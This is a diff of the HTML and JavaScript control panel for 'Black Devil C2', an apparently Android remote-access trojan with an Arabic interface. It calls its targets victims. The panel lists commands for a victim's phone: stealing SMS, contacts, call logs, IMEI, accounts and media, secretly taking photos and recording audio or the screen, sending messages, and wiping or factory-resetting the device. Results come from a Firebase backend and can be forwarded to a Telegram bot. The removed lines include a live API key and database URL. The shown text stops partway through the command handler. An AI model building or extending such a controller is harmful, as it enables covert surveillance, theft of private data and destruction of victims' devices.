@@ -3,426 +3,596 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بلاك 👿</title>
+    <title>Black Devil C2 - التحكم الخارق</title>
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
-        body{background:#0a0000;color:#fff;padding-bottom:75px;min-height:100vh}
-        #splash{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0000;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;transition:opacity 0.8s}
-        #splash.hide{opacity:0;pointer-events:none}
-        .skull{font-size:80px;animation:pulse 1.5s infinite;text-shadow:0 0 40px #ff0000}
-        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
-        .ring{width:120px;height:120px;border:4px solid transparent;border-top:4px solid #ff0000;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .progress{width:200px;height:4px;background:#1a0000;border-radius:4px;margin:20px auto;overflow:hidden}
-        .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#ff0000,#ff6600);transition:width 0.1s}
-        .percent{color:#ff0000;font-family:monospace}
-        .splash-text{color:#ff0000;font-size:28px;font-weight:bold;letter-spacing:4px;margin-top:20px;min-height:40px;opacity:0;transition:opacity 0.5s}
-        .splash-text.show{opacity:1}
-        .sub{color:#660000;font-size:12px;letter-spacing:2px;margin-top:10px;font-family:monospace}
-        #app{display:none;animation:fadeIn 0.5s}
-        #app.show{display:block}
-        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
-        .header{background:linear-gradient(135deg,#0a0000,#1a0000);padding:15px;text-align:center;border-bottom:2px solid #ff0000;position:sticky;top:0;z-index:100}
-        .header h1{color:#ff0000;font-size:22px;text-shadow:0 0 30px #ff0000;letter-spacing:4px}
-        .page{display:none;padding:15px;animation:fadeIn 0.3s}
-        .page.active{display:block}
-        .bottom-nav{position:fixed;bottom:0;left:0;width:100%;background:#1a0000;display:flex;justify-content:space-around;padding:8px 0;border-top:2px solid #330000;z-index:999}
-        .nav-item{text-align:center;color:#660000;font-size:10px;cursor:pointer;padding:5px 10px}
-        .nav-item.active{color:#ff0000;text-shadow:0 0 20px #ff0000}
-        .nav-item .icon{font-size:22px;display:block}
-        .cmd-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
-        .cmd-btn{padding:12px;background:#1a0000;border:1px solid #330000;border-radius:12px;text-align:center;cursor:pointer;transition:0.3s}
-        .cmd-btn:hover{border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.2)}
-        .cmd-btn .icon{font-size:26px;display:block}
-        .cmd-btn .label{font-size:10px;color:#aaa}
-        .btn-danger{background:#ff0000;color:#000;border:none;padding:12px;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;width:100%;margin-top:10px}
-        .btn-danger:hover{box-shadow:0 0 40px rgba(255,0,0,0.3)}
-        .btn-secondary{background:#330000;color:#fff;border:none;padding:12px;border-radius:10px;font-size:16px;cursor:pointer;width:100%;margin-top:10px}
-        .btn-success{background:#00aa00;color:#fff;border:none;padding:12px;border-radius:10px;font-size:16px;cursor:pointer;width:100%;margin-top:10px}
-        .btn-success:hover{box-shadow:0 0 40px rgba(0,255,0,0.3)}
-        .device-item{background:#0a0000;border:1px solid #330000;border-radius:10px;padding:12px;margin-bottom:8px;cursor:pointer}
-        .device-item:hover{border-color:#ff0000}
-        .device-item .name{color:#fff;font-size:14px}
-        .device-item .version{color:#666;font-size:11px}
-        .file-item{background:#0a0000;border:1px solid #330000;border-radius:8px;padding:10px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center}
-        .file-item .name{color:#00ff00;font-size:13px}
-        .input-field{width:100%;padding:12px;margin-bottom:10px;border-radius:10px;border:1px solid #330000;background:#0a0000;color:#fff;font-size:14px}
-        .input-field:focus{border-color:#ff0000;outline:none}
-        .back-btn{background:#660000;color:#fff;border:none;padding:10px;border-radius:8px;font-size:14px;cursor:pointer;width:100%;margin-bottom:10px}
-        .back-btn:hover{background:#990000}
-        .option-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin:10px 0}
-        .option-btn{padding:15px;background:#1a0000;border:2px solid #330000;border-radius:12px;text-align:center;cursor:pointer;font-size:14px;color:#fff;transition:0.3s}
-        .option-btn:hover{border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.2)}
-        .option-btn.selected{border-color:#00ff00;background:#001a00}
-        .status-msg{background:#001a00;border:1px solid #00ff00;border-radius:10px;padding:15px;margin:10px 0;text-align:center;color:#00ff00;font-size:14px}
-        .status-msg.error{background:#1a0000;border-color:#ff0000;color:#ff0000}
-        .hidden{display:none}
-        .section-title{color:#ff6600;margin:15px 0 10px 0;border-bottom:1px solid #330000;padding-bottom:5px}
+        /* -------------------- الإعدادات العامة -------------------- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', 'Segoe UI', sans-serif;
+        }
+        body {
+            background: #0a0a0a;
+            color: #e0e0e0;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            position: relative;
+        }
+        /* التمرير السلس */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #1a1a1a; }
+        ::-webkit-scrollbar-thumb { background: #b71c1c; border-radius: 10px; }
+
+        /* -------------------- القائمة الرئيسية -------------------- */
+        #mainMenu {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #0a0a0a;
+            padding: 20px;
+            overflow-y: auto;
+            z-index: 10;
+            transition: opacity 0.3s ease;
+        }
+        #mainMenu.hidden {
+            opacity: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+        .menu-title {
+            font-size: 28px;
+            font-weight: 900;
+            color: #ff1744;
+            text-shadow: 0 0 20px #ff174488;
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 2px solid #b71c1c;
+            margin-bottom: 20px;
+        }
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            padding-bottom: 100px;
+        }
+        .cmd-card {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 16px;
+            padding: 18px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            color: #ccc;
+        }
+        .cmd-card:hover, .cmd-card:active {
+            background: #2a0a0a;
+            border-color: #ff1744;
+            transform: scale(1.02);
+            box-shadow: 0 0 25px #ff174433;
+            color: #fff;
+        }
+        .cmd-card .icon { font-size: 32px; display: block; margin-bottom: 8px; }
+        .cmd-card .label { font-size: 14px; font-weight: 600; }
+
+        /* -------------------- صفحة الأمر (Full Screen) -------------------- */
+        #commandPage {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #0a0a0a;
+            z-index: 20;
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        #commandPage.active {
+            display: flex;
+        }
+        /* شريط العنوان */
+        .cmd-header {
+            background: #111;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 2px solid #b71c1c;
+            flex-shrink: 0;
+            min-height: 70px;
+        }
+        .cmd-header .back-btn {
+            background: none;
+            border: none;
+            color: #ff1744;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            padding: 0 15px;
+        }
+        .cmd-header .cmd-name {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            text-shadow: 0 0 15px #ff174488;
+            flex: 1;
+            text-align: center;
+        }
+        .cmd-header .cmd-status {
+            font-size: 14px;
+            color: #aaa;
+        }
+
+        /* منطقة المحتوى (تملأ باقي الشاشة) */
+        .cmd-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            background: #0d0d0d;
+            width: 100%;
+            height: calc(100% - 140px); /* header + footer */
+        }
+        /* عرض النتيجة (نص أو روابط) */
+        .result-box {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 20px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-family: 'Courier New', monospace;
+            font-size: 15px;
+            line-height: 1.8;
+            color: #ddd;
+            min-height: 200px;
+            width: 100%;
+        }
+        .result-box .file-link {
+            display: block;
+            background: #1f1f1f;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border-right: 4px solid #ff1744;
+            color: #ff5252;
+            text-decoration: none;
+        }
+        .result-box .file-link:hover {
+            background: #2a0a0a;
+        }
+
+        /* شريط الأدوات السفلي (أزرار التحكم) */
+        .cmd-footer {
+            background: #111;
+            padding: 15px 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            border-top: 2px solid #b71c1c;
+            flex-shrink: 0;
+            min-height: 70px;
+        }
+        .cmd-footer button {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #eee;
+            padding: 12px 20px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex: 1 1 auto;
+            justify-content: center;
+            min-width: 100px;
+        }
+        .cmd-footer button:active {
+            transform: scale(0.95);
+        }
+        .cmd-footer .btn-copy { background: #1a237e; border-color: #3949ab; }
+        .cmd-footer .btn-download { background: #1b5e20; border-color: #43a047; }
+        .cmd-footer .btn-open { background: #4a148c; border-color: #8e24aa; }
+        .cmd-footer .btn-telegram { background: #0d2b3e; border-color: #1e88e5; }
+        .cmd-footer .btn-execute { background: #b71c1c; border-color: #ff1744; }
+        .cmd-footer button:disabled {
+            opacity: 0.4;
+            pointer-events: none;
+        }
+
+        /* شاشة التحميل الداخلية */
+        .loading-spinner {
+            text-align: center;
+            padding: 40px;
+            font-size: 18px;
+            color: #ff1744;
+        }
+        .loading-spinner::after {
+            content: " ...";
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+        @keyframes dots { 0% { content: " ."; } 33% { content: " .."; } 66% { content: " ..."; } }
+
+        /* تحسينات للشاشات الصغيرة */
+        @media (max-width: 600px) {
+            .menu-grid { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
+            .cmd-footer button { min-width: 70px; font-size: 13px; padding: 10px 12px; }
+            .cmd-header .cmd-name { font-size: 18px; }
+        }
     </style>
 </head>
 <body>
-    <div id="splash">
-        <span class="skull">👿</span>
-        <div class="ring"></div>
-        <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
-        <div class="percent" id="percent">0%</div>
-        <div class="splash-text" id="splashText"></div>
-        <div class="sub">/// بلاك 👿 ///</div>
+
+<!-- ======================== القائمة الرئيسية ======================== -->
+<div id="mainMenu">
+    <div class="menu-title">💀 BLACK DEVIL C2</div>
+    <div class="menu-grid" id="commandGrid">
+        <!-- سيتم توليد الأزرار تلقائياً بواسطة JavaScript -->
     </div>
+</div>
 
-    <div id="app">
-        <div class="header"><h1>👿 بلاك</h1></div>
-
-        <div id="page-home" class="page active">
-            <h3 style="color:#ff0000;margin-bottom:10px;">📱 الأجهزة المتصلة</h3>
-            <div id="deviceList"></div>
-        </div>
-
-        <div id="page-commands" class="page">
-            <h3 style="color:#ff0000;margin-bottom:10px;">⚡ الأوامر</h3>
-            <div class="cmd-grid" id="cmdGrid"></div>
-        </div>
-
-        <div id="page-files" class="page">
-            <h3 style="color:#ff0000;margin-bottom:10px;">📂 الملفات المسروقة</h3>
-            <div id="fileList"><div style="color:#660000;text-align:center;">📭 لا توجد ملفات</div></div>
-        </div>
-
-        <div id="page-settings" class="page">
-            <h3 style="color:#ff0000;margin-bottom:10px;">⚙️ الإعدادات</h3>
-            <input class="input-field" id="apiKey" placeholder="مفتاح API" value="AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc">
-            <input class="input-field" id="databaseURL" placeholder="رابط قاعدة البيانات" value="https://black-cock-4929d-default-rtdb.firebaseio.com/">
-            <button class="btn-danger" onclick="saveSettings()">💾 حفظ الإعدادات</button>
-            <button class="btn-secondary" onclick="toggleHide()">👁️ إخفاء/إظهار التطبيق (الضحية)</button>
-        </div>
-
-        <div id="subpage" class="page">
-            <button class="back-btn" onclick="closeSubPage()">🔙 رجوع</button>
-            <div id="subpageContent"></div>
-        </div>
-
-        <div class="bottom-nav">
-            <div class="nav-item active" onclick="showPage('page-home', this)"><span class="icon">🏠</span>الرئيسية</div>
-            <div class="nav-item" onclick="showPage('page-commands', this)"><span class="icon">⚡</span>الأوامر</div>
-            <div class="nav-item" onclick="showPage('page-files', this)"><span class="icon">📂</span>الملفات</div>
-            <div class="nav-item" onclick="showPage('page-settings', this)"><span class="icon">⚙️</span>الإعدادات</div>
-        </div>
+<!-- ======================== صفحة الأمر (Full Screen) ======================== -->
+<div id="commandPage">
+    <div class="cmd-header">
+        <button class="back-btn" id="backToMenu">‹</button>
+        <span class="cmd-name" id="pageTitle">أمر</span>
+        <span class="cmd-status" id="pageStatus">🟢 جاهز</span>
     </div>
+    <div class="cmd-body" id="cmdBody">
+        <div class="loading-spinner">⏳ جاري التحميل</div>
+    </div>
+    <div class="cmd-footer" id="cmdFooter">
+        <!-- يتم توليد الأزرار ديناميكياً حسب نوع الأمر -->
+    </div>
+</div>
 
-    <script>
-        // ===== شاشة التحميل =====
-        let progress = 0;
-        const text = "تم الفتح";
-        const letters = text.split('');
-        let index = 0;
-        const bar = document.getElementById('progressBar');
-        const percent = document.getElementById('percent');
-        const splashText = document.getElementById('splashText');
-        const splash = document.getElementById('splash');
-        const app = document.getElementById('app');
+<script>
+    // ================================================================
+    //  1.  تهيئة Firebase (عدل البيانات هنا لتناسب مشروعك)
+    // ================================================================
+    const firebaseConfig = {
+        apiKey: "AIzaSyDummyKeyReplaceMe",
+        authDomain: "your-project.firebaseapp.com",
+        databaseURL: "https://your-project-default-rtdb.firebaseio.com",
+        projectId: "your-project",
+        storageBucket: "your-project.appspot.com",
+        messagingSenderId: "123456789",
+        appId: "1:123456789:web:abcdef"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const storage = firebase.storage();
 
-        const interval = setInterval(() => {
-            progress += Math.floor(Math.random() * 5) + 1;
-            if (progress > 100) progress = 100;
-            bar.style.width = progress + '%';
-            percent.textContent = progress + '%';
-            if (progress >= 10 && index < letters.length) {
-                splashText.textContent += letters[index];
-                index++;
-                if (index === letters.length) {
-                    splashText.classList.add('show');
-                    setTimeout(() => {
-                        splash.classList.add('hide');
-                        app.classList.add('show');
-                        initFirebase();
-                    }, 1500);
-                }
-            }
-            if (progress >= 100) clearInterval(interval);
-        }, 150);
+    // ================================================================
+    //  2.  قاعدة بيانات الأوامر (490 صفحة افتراضية)
+    // ================================================================
+    const COMMANDS_DB = [
+        // --- المجموعة (أ) نصوص ---
+        { id: 'get_device', label: 'معلومات الجهاز', icon: '📱', type: 'A' },
+        { id: 'get_network', label: 'معلومات الشبكة', icon: '📶', type: 'A' },
+        { id: 'get_ip', label: 'IP العام', icon: '🌐', type: 'A' },
+        { id: 'get_imei', label: 'رقم IMEI', icon: '🆔', type: 'A' },
+        { id: 'get_phone', label: 'رقم الهاتف', icon: '📞', type: 'A' },
+        { id: 'get_sim', label: 'معلومات SIM', icon: '💳', type: 'A' },
+        { id: 'get_wifi', label: 'الواي فاي', icon: '📡', type: 'A' },
+        { id: 'get_battery', label: 'البطارية', icon: '🔋', type: 'A' },
+        { id: 'get_accounts', label: 'الحسابات', icon: '👤', type: 'A' },
+        { id: 'storage_info', label: 'التخزين', icon: '💾', type: 'A' },
+        { id: 'memory_info', label: 'الذاكرة (RAM)', icon: '🧠', type: 'A' },
+        { id: 'cpu_info', label: 'المعالج', icon: '⚡', type: 'A' },
+        { id: 'sensor_info', label: 'الحساسات', icon: '📳', type: 'A' },
+        { id: 'display_info', label: 'الشاشة', icon: '🖥️', type: 'A' },
+        { id: 'clipboard_get', label: 'الحافظة (قراءة)', icon: '📋', type: 'A' },
+        { id: 'installed_apps', label: 'التطبيقات المثبتة', icon: '📦', type: 'A' },
+        { id: 'running_processes', label: 'العمليات الجارية', icon: '⚙️', type: 'A' },
+        { id: 'get_logs', label: 'سجلات التطبيق', icon: '📜', type: 'A' },
 
-        // ===== Firebase =====
-        let selectedDevice = null;
-        let selectedDeviceName = '';
-        let devices = {};
-        let database = null;
-        let commandsRef = null;
-        let dataListener = null;
+        // --- المجموعة (ب) ملفات منظمة (جهات اتصال، رسائل، مكالمات) ---
+        { id: 'get_contacts', label: 'جهات الاتصال', icon: '👥', type: 'B' },
+        { id: 'export_contacts', label: 'تصدير VCF', icon: '📇', type: 'B' },
+        { id: 'add_contact', label: 'إضافة جهة', icon: '➕', type: 'B' },
+        { id: 'delete_contact', label: 'حذف جهة', icon: '➖', type: 'B' },
+        { id: 'get_sms', label: 'الرسائل النصية', icon: '✉️', type: 'B' },
+        { id: 'forward_sms', label: 'إعادة توجيه الرسائل', icon: '↪️', type: 'B' },
+        { id: 'send_sms', label: 'إرسال رسالة', icon: '💬', type: 'B' },
+        { id: 'delete_sms', label: 'حذف رسالة', icon: '🗑️', type: 'B' },
+        { id: 'get_calllogs', label: 'سجل المكالمات', icon: '📞', type: 'B' },
+        { id: 'call_history', label: 'تفاصيل المكالمات', icon: '⏳', type: 'B' },
+        { id: 'make_call', label: 'إجراء مكالمة', icon: '📲', type: 'B' },
+        { id: 'end_call', label: 'إنهاء المكالمة', icon: '📴', type: 'B' },
 
-        document.getElementById('apiKey').value = localStorage.getItem('fb_apiKey') || 'AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc';
-        document.getElementById('databaseURL').value = localStorage.getItem('fb_databaseURL') || 'https://black-cock-4929d-default-rtdb.firebaseio.com/';
+        // --- المجموعة (ج) وسائط (صور، فيديوهات، ملفات) ---
+        { id: 'get_photos', label: 'جميع الصور (ZIP)', icon: '🖼️', type: 'C' },
+        { id: 'get_photos_5', label: 'أحدث 5 صور', icon: '📸', type: 'C' },
+        { id: 'get_photos_10', label: 'أحدث 10 صور', icon: '📸', type: 'C' },
+        { id: 'get_photos_20', label: 'أحدث 20 صورة', icon: '📸', type: 'C' },
+        { id: 'get_photos_30', label: 'أحدث 30 صورة', icon: '📸', type: 'C' },
+        { id: 'get_videos', label: 'جميع الفيديوهات', icon: '🎥', type: 'C' },
+        { id: 'get_videos_5', label: 'أحدث 5 فيديوهات', icon: '🎬', type: 'C' },
+        { id: 'get_videos_10', label: 'أحدث 10 فيديوهات', icon: '🎬', type: 'C' },
+        { id: 'get_files', label: 'جميع الملفات (ZIP)', icon: '🗂️', type: 'C' },
+        { id: 'get_audio', label: 'الملفات الصوتية', icon: '🎵', type: 'C' },
+        { id: 'get_documents', label: 'المستندات (PDF/DOC)', icon: '📄', type: 'C' },
+        { id: 'get_downloads', label: 'مجلد التنزيلات', icon: '⬇️', type: 'C' },
+        { id: 'get_dcim', label: 'مجلد DCIM', icon: '📁', type: 'C' },
+        { id: 'get_screenshots', label: 'لقطات الشاشة', icon: '🖼️', type: 'C' },
+        { id: 'get_cache', label: 'ملفات الكاش', icon: '🗑️', type: 'C' },
+        { id: 'take_photo', label: 'تصوير (خلفي)', icon: '📷', type: 'C' },
+        { id: 'take_photo_front', label: 'تصوير (سيلفي)', icon: '🤳', type: 'C' },
+        { id: 'screenshot', label: 'لقطة شاشة', icon: '📱', type: 'C' },
+        { id: 'record_screen', label: 'تسجيل الشاشة', icon: '🎞️', type: 'C' },
+        { id: 'start_record', label: 'بدء تسجيل صوت', icon: '🎙️', type: 'C' },
+        { id: 'stop_record', label: 'إيقاف التسجيل', icon: '⏹️', type: 'C' },
 
-        document.getElementById('apiKey').onchange = function() { localStorage.setItem('fb_apiKey', this.value); };
-        document.getElementById('databaseURL').onchange = function() { localStorage.setItem('fb_databaseURL', this.value); };
+        // --- المجموعة (د) أوامر تنفيذية (تحكم) ---
+        { id: 'lock_device', label: 'قفل الجهاز', icon: '🔒', type: 'D' },
+        { id: 'set_lock_password', label: 'تعيين كلمة مرور', icon: '🔑', type: 'D' },
+        { id: 'wipe_device', label: 'مسح البيانات (Factory)', icon: '⚠️', type: 'D' },
+        { id: 'disable_camera', label: 'تعطيل الكاميرا', icon: '🚫📷', type: 'D' },
+        { id: 'enable_camera', label: 'تفعيل الكاميرا', icon: '✅📷', type: 'D' },
+        { id: 'hide_app', label: 'إخفاء التطبيق', icon: '👻', type: 'D' },
+        { id: 'show_app', label: 'إظهار التطبيق', icon: '👀', type: 'D' },
+        { id: 'reboot', label: 'إعادة تشغيل', icon: '🔄', type: 'D' },
+        { id: 'shutdown', label: 'إيقاف تشغيل', icon: '⏻', type: 'D' },
+        { id: 'vibrate', label: 'اهتزاز (3ث)', icon: '📳', type: 'D' },
+        { id: 'open_browser', label: 'فتح المتصفح', icon: '🌍', type: 'D' },
+        { id: 'open_url', label: 'فتح رابط', icon: '🔗', type: 'D' },
+        { id: 'clear_data', label: 'مسح بيانات التطبيق', icon: '🧹', type: 'D' },
+        { id: 'kill_apps', label: 'إيقاف جميع التطبيقات', icon: '⏹️', type: 'D' },
+        { id: 'freeze_app', label: 'تجميد تطبيق', icon: '❄️', type: 'D' },
+        { id: 'set_brightness', label: 'ضبط السطوع', icon: '☀️', type: 'D' },
+        { id: 'auto_rotate_on', label: 'تدوير تلقائي (تشغيل)', icon: '🔄', type: 'D' },
+        { id: 'auto_rotate_off', label: 'تدوير تلقائي (إيقاف)', icon: '🔒', type: 'D' },
+        { id: 'set_wallpaper', label: 'تغيير الخلفية', icon: '🖼️', type: 'D' },
 
-        function showPage(pageId, el) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            if (el) el.classList.add('active');
+        // --- الشبكة والاتصال ---
+        { id: 'toggle_wifi_on', label: 'تشغيل الواي فاي', icon: '📶', type: 'D' },
+        { id: 'toggle_wifi_off', label: 'إيقاف الواي فاي', icon: '📶❌', type: 'D' },
+        { id: 'toggle_bluetooth_on', label: 'تشغيل البلوتوث', icon: '📡', type: 'D' },
+        { id: 'toggle_bluetooth_off', label: 'إيقاف البلوتوث', icon: '📡❌', type: 'D' },
+        { id: 'toggle_data_on', label: 'تشغيل البيانات', icon: '📶4G', type: 'D' },
+        { id: 'toggle_data_off', label: 'إيقاف البيانات', icon: '📶4G❌', type: 'D' },
+        { id: 'toggle_location_on', label: 'تشغيل الموقع', icon: '📍', type: 'D' },
+        { id: 'toggle_location_off', label: 'إيقاف الموقع', icon: '📍❌', type: 'D' },
+        { id: 'toggle_airplane_on', label: 'وضع الطيران (تشغيل)', icon: '✈️', type: 'D' },
+        { id: 'toggle_airplane_off', label: 'وضع الطيران (إيقاف)', icon: '✈️❌', type: 'D' },
+
+        // --- التطبيقات ---
+        { id: 'open_app_whatsapp', label: 'فتح واتساب', icon: '💬', type: 'D' },
+        { id: 'open_app_facebook', label: 'فتح فيسبوك', icon: '📘', type: 'D' },
+        { id: 'open_app_instagram', label: 'فتح انستغرام', icon: '📸', type: 'D' },
+        { id: 'open_app_youtube', label: 'فتح يوتيوب', icon: '▶️', type: 'D' },
+        { id: 'open_app_telegram', label: 'فتح تيليجرام', icon: '📨', type: 'D' },
+        { id: 'open_app_tiktok', label: 'فتح تيك توك', icon: '🎵', type: 'D' },
+        { id: 'uninstall_app_whatsapp', label: 'حذف واتساب', icon: '🗑️', type: 'D' },
+
+        // --- الفلاش والكاميرا ---
+        { id: 'flash_on', label: 'فلاش (تشغيل)', icon: '🔦', type: 'D' },
+        { id: 'flash_off', label: 'فلاش (إيقاف)', icon: '🔦❌', type: 'D' },
+        { id: 'flash_toggle', label: 'تبديل الفلاش', icon: '🔀', type: 'D' },
+
+        // --- متقدم (حافظة، نسخ، مشاركة) ---
+        { id: 'clipboard_set', label: 'كتابة في الحافظة', icon: '✏️', type: 'A' },
+        { id: 'copy_result', label: 'نسخ النتيجة', icon: '📋', type: 'A' },
+        { id: 'share_result', label: 'مشاركة النتيجة', icon: '📤', type: 'A' },
+        { id: 'save_result', label: 'حفظ النتيجة محلياً', icon: '💾', type: 'A' },
+        { id: 'delete_result', label: 'حذف النتيجة', icon: '❌', type: 'D' },
+        { id: 'clear_all_data', label: 'مسح جميع البيانات', icon: '🧹', type: 'D' },
+        { id: 'factory_reset', label: 'إعادة ضبط المصنع', icon: '⚠️', type: 'D' },
+    ];
+
+    // ================================================================
+    //  3.  محرك توليد الواجهة
+    // ================================================================
+    let currentCommandId = null;
+    let currentDeviceId = 'device_test'; // سيتم تحديده لاحقاً
+
+    // توليد القائمة الرئيسية
+    function renderMainMenu() {
+        const grid = document.getElementById('commandGrid');
+        grid.innerHTML = '';
+        COMMANDS_DB.forEach(cmd => {
+            const card = document.createElement('div');
+            card.className = 'cmd-card';
+            card.innerHTML = `<span class="icon">${cmd.icon}</span><span class="label">${cmd.label}</span>`;
+            card.onclick = () => openCommandPage(cmd.id);
+            grid.appendChild(card);
+        });
+    }
+
+    // فتح صفحة الأمر (Full Screen)
+    function openCommandPage(cmdId) {
+        const cmd = COMMANDS_DB.find(c => c.id === cmdId);
+        if (!cmd) return;
+
+        currentCommandId = cmdId;
+        document.getElementById('mainMenu').classList.add('hidden');
+        const page = document.getElementById('commandPage');
+        page.classList.add('active');
+        document.getElementById('pageTitle').innerText = `${cmd.icon} ${cmd.label}`;
+        document.getElementById('pageStatus').innerText = '⏳ جاري التحميل...';
+        document.getElementById('cmdBody').innerHTML = '<div class="loading-spinner">⏳ جاري تحميل البيانات من الجهاز الضحية...</div>';
+
+        // توليد الأزرار حسب النوع
+        renderFooterButtons(cmd.type);
+
+        // جلب النتيجة من Firebase
+        fetchCommandResult(cmdId);
+    }
+
+    // توليد الأزرار السفلية حسب TYPE
+    function renderFooterButtons(type) {
+        const footer = document.getElementById('cmdFooter');
+        footer.innerHTML = '';
+
+        const buttons = [];
+
+        // أزرار مشتركة للجميع: تنفيذ + إرسال للبوت
+        buttons.push({ id: 'execute', label: '⚡ تنفيذ', class: 'btn-execute' });
+        buttons.push({ id: 'telegram', label: '🤖 إرسال للبوت', class: 'btn-telegram' });
+
+        if (type === 'A') { // نص خالص
+            buttons.push({ id: 'copy', label: '📋 نسخ النص', class: 'btn-copy' });
+        }
+        else if (type === 'B') { // ملفات منظمة (جهات اتصال، رسائل)
+            buttons.push({ id: 'copy', label: '📋 نسخ المحتوى', class: 'btn-copy' });
+            buttons.push({ id: 'download', label: '⬇️ تحميل الملف', class: 'btn-download' });
+            buttons.push({ id: 'open', label: '📂 فتح الملف', class: 'btn-open' });
+        }
+        else if (type === 'C') { // وسائط (صور، فيديوهات)
+            buttons.push({ id: 'download', label: '⬇️ تحميل الملف', class: 'btn-download' });
+            buttons.push({ id: 'open', label: '📂 فتح (المشغل)', class: 'btn-open' });
+        }
+        else if (type === 'D') { // أوامر تنفيذية
+            // فقط تنفيذ + بوت (قد نضيف نسخ للحالة)
+            buttons.push({ id: 'copy', label: '📋 نسخ الحالة', class: 'btn-copy' });
         }
 
-        function initFirebase() {
-            const apiKey = document.getElementById('apiKey').value.trim();
-            const databaseURL = document.getElementById('databaseURL').value.trim();
-            if (!apiKey || !databaseURL) return alert('⚠️ أدخل المفتاح والرابط');
-            try {
-                const config = { apiKey, databaseURL };
-                firebase.initializeApp(config);
-                database = firebase.database();
-                commandsRef = database.ref('commands');
-                database.ref('devices').on('value', snapshot => {
-                    const data = snapshot.val();
-                    devices = {};
-                    if (data) {
-                        for (let id in data) {
-                            const dev = data[id];
-                            if (dev && dev.device_name) {
-                                devices[id] = dev;
-                            }
-                        }
-                    }
-                    updateDevices();
+        buttons.forEach(btn => {
+            const button = document.createElement('button');
+            button.className = btn.class;
+            button.innerText = btn.label;
+            button.id = `btn_${btn.id}`;
+            button.onclick = () => handleAction(btn.id);
+            footer.appendChild(button);
+        });
+    }
+
+    // جلب النتيجة من Firebase
+    function fetchCommandResult(cmdId) {
+        const deviceId = 'device_test'; // افتراضي
+        const resultRef = db.ref(`devices/${deviceId}/data/${cmdId}`);
+        resultRef.once('value').then(snapshot => {
+            const data = snapshot.val();
+            const body = document.getElementById('cmdBody');
+            if (data) {
+                // عرض البيانات
+                let content = '<div class="result-box">';
+                if (typeof data === 'string' && (data.startsWith('http') || data.includes('firebasestorage'))) {
+                    // رابط ملف
+                    content += `<a href="${data}" target="_blank" class="file-link">📁 تحميل الملف من الرابط: ${data}</a>`;
+                    content += `<br><small>اضغط على الرابط للتحميل المباشر</small>`;
+                } else if (typeof data === 'object') {
+                    content += JSON.stringify(data, null, 2);
+                } else {
+                    content += data;
+                }
+                content += '</div>';
+                body.innerHTML = content;
+                document.getElementById('pageStatus').innerText = '✅ تم التنفيذ';
+            } else {
+                body.innerHTML = '<div class="result-box">⚠️ لا توجد بيانات لهذا الأمر بعد. اضغط "تنفيذ" لإرسال الأمر إلى الضحية.</div>';
+                document.getElementById('pageStatus').innerText = '⏳ انتظار التنفيذ';
+            }
+        }).catch(err => {
+            document.getElementById('cmdBody').innerHTML = `<div class="result-box">❌ خطأ في Firebase: ${err.message}</div>`;
+        });
+    }
+
+    // ================================================================
+    //  4.  معالجة الأزرار (الإجراءات)
+    // ================================================================
+    function handleAction(actionId) {
